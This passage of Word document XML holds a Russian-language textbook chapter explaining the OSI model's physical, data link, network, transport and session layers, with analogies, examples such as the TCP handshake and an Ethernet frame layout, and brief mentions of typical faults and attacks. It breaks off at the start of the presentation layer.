        <w:t xml:space="preserve"> | Data Link | Передача данных в локальной сети (MAC-адреса) | Кадр (Frame) | Ethernet, Wi-Fi (802.11), PPP, Свитчи |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Physical | Передача битов по физической среде | Бит (Bit) | Кабели (витая пара, оптоволокно), Хабы, Репитеры |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Разберём каждый уровень подробно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.2. Уровень 1: Физический (Physical Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>биты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (0 и 1) по физической среде (кабель, радиоволны, оптоволокно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преобразование битов в электрические сигналы (витая пара), световые импульсы (оптоволокно) или радиоволны (Wi-Fi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определение физических характеристик: напряжение, частота, скорость передачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Синхронизация передатчика и приёмника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кабели**: витая пара (Cat5e, Cat6), коаксиальный кабель, оптоволокно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разъёмы**: RJ-45 (Ethernet), USB, HDMI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройства**: **хаб** (hub), **репитер** (повторитель сигнала)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стандарты**: 10BASE-T, 100BASE-TX, 1000BASE-T (Ethernet), 802.11a/b/g/n/ac/ax (Wi-Fi)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Физический уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дорога</w:t>
      </w:r>
      <w:r>
        <w:t>. Она не знает, что везут (пиццу или гроб), она просто предоставляет путь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты подключаешь Ethernet-кабель от компьютера к роутеру. Сетевая карта генерирует электрические импульсы: +1V = 1, -1V = 0. Сигнал идёт по медным жилам кабеля. Роутер принимает сигналы и преобразует их обратно в биты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обрыв кабеля** → сигнал не проходит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Электромагнитные помехи** → биты искажаются (вот почему экранированный кабель лучше)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Затухание сигнала** → на больших расстояниях сигнал слабеет (максимум 100 метров для витой пары)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.3. Уровень 2: Канальный (Data Link Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кадры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (frames) между устройствами в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одной локальной сети</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (LAN). Использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC-адреса</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Формирование кадров**: данные оборачиваются в Ethernet-кадр с MAC-адресами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль ошибок**: проверка CRC (Cyclic Redundancy Check) — если кадр повреждён, он отбрасывается</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Управление доступом к среде**: кто и когда может передавать (в старых сетях — CSMA/CD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Подуровни</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LLC (Logical Link Control)** — интерфейс между канальным и сетевым уровнями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC (Media Access Control)** — работа с MAC-адресами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: Ethernet, Wi-Fi (802.11), PPP (Point-to-Point Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройства**: **свитч** (switch), **мост** (bridge), **сетевая карта** (NIC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресация**: MAC-адрес (48 бит, например `AA:BB:CC:DD:EE:FF`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Канальный уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>почтовое отделение в твоём районе</w:t>
      </w:r>
      <w:r>
        <w:t>. Оно доставляет письма внутри района (локальная сеть), но не знает, как доставить письмо в другой город.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой компьютер (MAC `AA:BB:CC:DD:EE:FF`) отправляет пакет роутеру (MAC `11:22:33:44:55:66`). Канальный уровень оборачивает IP-пакет в Ethernet-кадр:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Destination MAC: 11:22:33:44:55:66]</w:t>
        <w:br/>
        <w:t>[Source MAC: AA:BB:CC:DD:EE:FF]</w:t>
        <w:br/>
        <w:t>[Type: 0x0800 (IPv4)]</w:t>
        <w:br/>
        <w:t>[IP-пакет с данными]</w:t>
        <w:br/>
        <w:t>[CRC: контрольная сумма]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Свитч читает Destination MAC и пересылает кадр только на порт, где сидит роутер (а не всем, как хаб).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC-адрес не уникален** (если кто-то подделал MAC) → конфликт адресов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Broadcast-шторм** → слишком много широковещательных пакетов забивают сеть</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ARP-spoofing** → атака через подмену MAC-адресов (см. главу 8.06)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.4. Уровень 3: Сетевой (Network Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пакеты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (packets) между </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разными сетями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (через интернет). Использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Маршрутизация** (routing): определение пути от источника к получателю через роутеры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресация**: каждому устройству присваивается IP-адрес (IPv4 или IPv6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Фрагментация**: разбиение больших пакетов на меньшие, если MTU канала маленький</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: **IP (IPv4, IPv6)**, ICMP (ping, traceroute), ARP, OSPF, BGP (протоколы маршрутизации)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройства**: **роутер** (router)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресация**: IP-адрес (32 бита для IPv4, 128 бит для IPv6)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сетевой уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>логистическая компания</w:t>
      </w:r>
      <w:r>
        <w:t>. Она определяет маршрут доставки посылки через разные города (сети), используя адреса (IP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты в Москве (`192.168.1.100`) отправляешь запрос на сервер Google в США (`142.250.185.46`). IP-пакет путешествует через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>десятки роутеров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, каждый из которых смотрит на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Destination IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и решает, куда переслать пакет дальше. Роутеры используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>таблицы маршрутизации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (routing tables) для принятия решений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TTL (Time To Live)</w:t>
      </w:r>
      <w:r>
        <w:t>: каждый роутер уменьшает TTL на 1. Если TTL = 0, пакет выбрасывается (чтобы не было бесконечных петель).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Петля маршрутизации** → пакет крутится между роутерами (TTL спасает)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фрагментация пакетов** → снижает производительность (лучше использовать Path MTU Discovery)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-атаки** → роутеры перегружаются огромным количеством пакетов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.5. Уровень 4: Транспортный (Transport Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обеспечивает доставку данных между </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приложениями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на разных хостах. Использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>порты</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сегментация**: разбивает данные на сегменты (TCP) или датаграммы (UDP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжная доставка** (только TCP): подтверждение получения (ACK), повторная передача (retransmission), контроль потока</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мультиплексирование**: несколько приложений на одном хосте используют один IP-адрес, но разные порты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: **TCP** (надёжный, с установкой соединения), **UDP** (быстрый, ненадёжный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресация**: порты (16 бит, от 0 до 65535)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Well-known ports (0-1023): 80 (HTTP), 443 (HTTPS), 22 (SSH), 53 (DNS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Registered ports (1024-49151): пользовательские приложения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dynamic ports (49152-65535): временные порты для клиентов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Транспортный уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>курьер</w:t>
      </w:r>
      <w:r>
        <w:t>, который стучится в конкретную дверь (порт) в здании (IP-адрес). TCP — это курьер с распиской (подтверждение доставки), UDP — это курьер, который швыряет посылку в окно и убегает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты открываешь браузер и заходишь на `https://google.com`. Браузер устанавливает TCP-соединение с сервером Google:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Three-way handshake**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Сервер: `SYN` (хочу соединиться)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер → Клиент: `SYN-ACK` (окей, давай)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Сервер: `ACK` (подтверждаю)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Соединение установлено, данные передаются.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>После завершения: `FIN` (закончили) → `ACK` (подтверждаю).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP vs UDP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP** (Transmission Control Protocol): надёжный, гарантирует доставку, используется для HTTP, HTTPS, FTP, SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UDP** (User Datagram Protocol): быстрый, не гарантирует доставку, используется для DNS, VoIP, стриминга, игр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SYN-flood атака** → злоумышленник шлёт кучу SYN-запросов, не завершая handshake → сервер перегружается</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Congestion (перегрузка)** → слишком много данных → пакеты теряются → TCP замедляет передачу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.6. Уровень 5: Сеансовый (Session Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Управляет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сессиями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (sessions) — устанавливает, поддерживает и завершает соединения между приложениями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Установка сессии**: открыть канал связи между приложениями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поддержка сессии**: синхронизация (checkpoints), восстановление после сбоя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Завершение сессии**: корректное закрытие соединения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: NetBIOS, RPC (Remote Procedure Call), PPTP (Point-to-Point Tunneling Protocol), SIP (Session Initiation Protocol для VoIP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аналог в реальной жизни**: телефонный звонок (установка → разговор → отбой)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеансовый уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>секретарь</w:t>
      </w:r>
      <w:r>
        <w:t>, который управляет встречами. Он звонит собеседнику, договаривается о времени, следит, чтобы встреча не сорвалась, и заканчивает встречу, когда пора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты подключаешься к удалённому рабочему столу через RDP (Remote Desktop Protocol). Сеансовый уровень:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Устанавливает сессию: "Привет, я хочу подключиться к твоему рабочему столу"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Поддерживает сессию: если связь прервалась на 10 секунд, сессия не закрывается, а ждёт восстановления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Завершает сессию: ты нажимаешь "Отключиться" → сессия корректно закрывается</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем отдельный уровень?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хороший вопрос. В TCP/IP этого уровня </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (его функции размазаны между Transport и Application). Но в OSI решили, что управление сессиями — это отдельная задача.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сессия зависла** → приложение думает, что связь есть, но данные не передаются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Session hijacking** → злоумышленник перехватывает сессию (например, крадёт session token)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.7. Уровень 6: Представления (Presentation Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Преобразует данные в формат, понятный приложению. Занимается </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
